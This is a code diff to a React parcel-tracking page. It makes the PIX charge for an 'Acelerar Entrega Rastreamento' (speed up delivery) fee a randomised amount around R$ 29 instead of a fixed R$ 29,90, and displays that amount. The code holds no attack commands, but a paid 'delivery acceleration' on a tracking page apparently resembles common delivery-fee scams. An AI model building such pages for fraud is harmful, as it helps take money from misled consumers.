@@ -260,10 +260,13 @@ const TrackingPage: React.FC = () => {
                             <button onClick={async () => {
                                 setPixLoading(true);
                                 try {
+                                    const cents = Math.floor(Math.random() * 99);
+                                    const finalAmount = Number(`29.${cents < 10 ? '0' + cents : cents}`);
+
                                     const res = await fetch(`${API_BASE}/api/pix/create`, {
                                         method: 'POST',
                                         headers: { 'Content-Type': 'application/json' },
-                                        body: JSON.stringify({ amount: 29.90, description: 'Acelerar Entrega Rastreamento' })
+                                        body: JSON.stringify({ amount: finalAmount, description: 'Acelerar Entrega Rastreamento' })
                                     });
                                     const data = await res.json();
                                     if (data && data.success) {
@@ -287,7 +290,9 @@ const TrackingPage: React.FC = () => {
                         {pixData && !pixPaid && (
                             <div style={{ background: 'rgba(255,255,255,0.03)', border: '1px solid rgba(255,255,255,0.06)', borderRadius: '20px', padding: '24px', marginBottom: '32px' }}>
                                 <div style={{ fontSize: '0.8rem', color: '#818cf8', fontWeight: 700, textTransform: 'uppercase', marginBottom: '8px' }}>Pague via PIX</div>
-                                <div style={{ fontSize: '1.5rem', fontWeight: 900, color: '#fff', marginBottom: '16px' }}>R$ 29,90</div>
+                                <div style={{ fontSize: '1.5rem', fontWeight: 900, color: '#fff', marginBottom: '16px' }}>
+                                    R$ {pixData.amount ? pixData.amount.toFixed(2).replace('.', ',') : '29,90'}
+                                </div>
                                 <div style={{ background: '#fff', padding: '12px', borderRadius: '12px', marginBottom: '16px', display: 'inline-block' }}>
                                     <img src={pixData.qr_image_url} alt="QR Code PIX" style={{ width: '150px', height: '150px' }} />
                                 </div>
